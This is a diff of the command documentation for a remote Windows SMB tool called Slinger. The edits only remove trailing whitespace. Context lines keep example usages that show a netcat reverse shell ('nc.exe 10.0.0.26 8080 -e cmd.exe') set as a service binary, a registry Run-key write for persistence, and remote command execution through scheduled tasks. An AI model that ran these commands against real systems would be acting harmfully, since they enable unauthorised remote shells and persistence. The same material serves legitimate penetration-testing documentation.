@@ -39,7 +39,7 @@ Example Usage: ls /path/to/directory
 
 ### Arguments
 
-- **`path`**: Path to list contents, defaults to current path 
+- **`path`**: Path to list contents, defaults to current path
   - Default: `.`
   - Required: No
 
@@ -76,9 +76,9 @@ Example Usage: shares
 
 **Help:**
 ```
-find [-h] [-type {f,d}] [-size SIZE] [-mtime DAYS] [-ctime DAYS] [-atime DAYS] 
-     [-maxdepth DEPTH] [-mindepth DEPTH] [-regex] [-iname] [-empty] [-hidden] 
-     [-progress] [-timeout SECONDS] [-o OUTPUT] [--limit LIMIT] 
+find [-h] [-type {f,d}] [-size SIZE] [-mtime DAYS] [-ctime DAYS] [-atime DAYS]
+     [-maxdepth DEPTH] [-mindepth DEPTH] [-regex] [-iname] [-empty] [-hidden]
+     [-progress] [-timeout SECONDS] [-o OUTPUT] [--limit LIMIT]
      [--format {table,json,list,paths}] pattern [path]
 ```
 
@@ -182,7 +182,7 @@ Example Usage: cd /path/to/directory
 
 ### Arguments
 
-- **`path`**: Directory path to change to, defaults to current directory 
+- **`path`**: Directory path to change to, defaults to current directory
   - Default: `.`
   - Required: No
 
@@ -1003,7 +1003,7 @@ Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"
 - **`displayname`**: Specify the display name of the new service
   - Required: Yes
 
-- **`starttype`**: Specify the start type of the new service 
+- **`starttype`**: Specify the start type of the new service
   - Choices: auto, demand, system
   - Default: `demand`
   - Required: Yes
@@ -1036,7 +1036,7 @@ Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"
 - **`displayname`**: Specify the display name of the new service
   - Required: Yes
 
-- **`starttype`**: Specify the start type of the new service 
+- **`starttype`**: Specify the start type of the new service
   - Choices: auto, demand, system
   - Default: `demand`
   - Required: Yes
@@ -1069,7 +1069,7 @@ Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"
 - **`displayname`**: Specify the display name of the new service
   - Required: Yes
 
-- **`starttype`**: Specify the start type of the new service 
+- **`starttype`**: Specify the start type of the new service
   - Choices: auto, demand, system
   - Default: `demand`
   - Required: Yes
@@ -1102,7 +1102,7 @@ Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"
 - **`displayname`**: Specify the display name of the new service
   - Required: Yes
 
-- **`starttype`**: Specify the start type of the new service 
+- **`starttype`**: Specify the start type of the new service
   - Choices: auto, demand, system
   - Default: `demand`
   - Required: Yes
@@ -1556,7 +1556,7 @@ Example Usage: mget /remote/path /local/path
 - **`p`**: Specify a regex pattern to match filenames
   - Required: No
 
-- **`d`**: Specify folder depth count for recursion 
+- **`d`**: Specify folder depth count for recursion
   - Default: `2`
   - Required: No
 
@@ -1783,7 +1783,7 @@ Example Usage: regset -k HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
 - **`data`**: Specify the registry data to set
   - Required: Yes
 
-- **`type`**: Specify the registry type to set 
+- **`type`**: Specify the registry type to set
   - Default: `REG_SZ`
   - Required: No
 
@@ -2182,7 +2182,7 @@ Example Usage: counter -c 123 [-a x86]
 - **`counter`**: Specify the counter to display
   - Required: No
 
-- **`arch`**: Specify the architecture of the remote server 
+- **`arch`**: Specify the architecture of the remote server
   - Choices: x86, x64, unk
   - Default: `unk`
   - Required: No
@@ -2226,7 +2226,7 @@ Example Usage: atexec -tn "NetSvc" -sh C$ -sp \\Users\\Public\\Downloads\\ -c ip
 - **`command`**: Specify the command to execute
   - Required: Yes
 
-- **`path`**: Specify the folder to save the output file 
+- **`path`**: Specify the folder to save the output file
   - Default: `\Users\Public\Downloads\`
   - Required: Yes
 
@@ -2236,23 +2236,23 @@ Example Usage: atexec -tn "NetSvc" -sh C$ -sp \\Users\\Public\\Downloads\\ -c ip
 - **`name`**: Specify the name of the scheduled task
   - Required: Yes
 
-- **`author`**: Specify the author of the scheduled task 
+- **`author`**: Specify the author of the scheduled task
   - Default: `Slinger`
   - Required: No
 
-- **`description`**: Specify the description of the scheduled task 
+- **`description`**: Specify the description of the scheduled task
   - Default: `Scheduled task created by Slinger`
   - Required: No
 
-- **`folder`**: Specify the folder to run the task in 
+- **`folder`**: Specify the folder to run the task in
   - Default: `\Windows`
   - Required: No
 
-- **`share`**: Specify the share name to connect to 
+- **`share`**: Specify the share name to connect to
   - Default: `C$`
   - Required: No
 
-- **`wait`**: Seconds to wait for the task to complete 
+- **`wait`**: Seconds to wait for the task to complete
   - Default: `1`
   - Required: No
 
@@ -2291,4 +2291,3 @@ Example Usage: plugins
 ```
 
 ---
-
